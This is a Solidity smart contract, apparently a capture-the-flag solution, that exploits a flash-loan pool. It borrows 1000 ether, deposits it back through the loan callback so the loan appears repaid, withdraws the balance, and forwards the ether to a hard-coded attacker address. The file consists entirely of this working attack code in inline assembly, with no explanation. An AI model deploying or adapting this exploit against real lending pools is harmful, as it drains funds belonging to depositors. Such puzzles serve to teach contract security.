// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract FlashLoanEtherReceiver {
  uint256 constant ETHER_IN_POOL = 1000 ether;
  address constant IT_IS_A_ME = 0x44E97aF4418b7a17AABD8090bEA0A471a366305C;
  address constant POOL = 0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b;

  function init() public payable {
    bytes4 flashLoan = 0x9ab603b9; //flashLoan(uint256)
    bytes4 withdraw = 0x3ccfd60b; //withdraw()

    assembly {
      let calldataOffset := mload(0x40)
      mstore(0x40, add(calldataOffset, 0x44))
      mstore(calldataOffset, flashLoan)
      mstore(add(calldataOffset, 0x04), ETHER_IN_POOL)

      pop(
        call(
          gas(),
          POOL,
          0, // msg.value
          calldataOffset,
          0x44,
          0, // return data offset
          0 // return data length
        )
      )
    }

    assembly {
      let calldataOffset := mload(0x40)
      mstore(0x40, add(calldataOffset, 0x44))
      mstore(calldataOffset, withdraw)

      pop(
        call(
          gas(),
          POOL,
          0, // msg.value
          calldataOffset,
          0x44,
          0, // return data offset
          0 // return data length
        )
      )
    }
  }

  function execute() external payable {
    bytes4 deposit = 0xd0e30db0; //deposit()
    assembly {
      let calldataOffset := mload(0x40)
      mstore(0x40, add(calldataOffset, 0x44))
      mstore(calldataOffset, deposit)

      pop(
        call(
          gas(),
          POOL,
          ETHER_IN_POOL, // msg.value
          calldataOffset,
          0x44,
          0, // return data offset
          0 // return data length
        )
      )
    }
  }

  receive() external payable {
    assembly {
      pop(call(21000, IT_IS_A_ME, ETHER_IN_POOL, 0, 0, 0, 0))
    }
  }
}
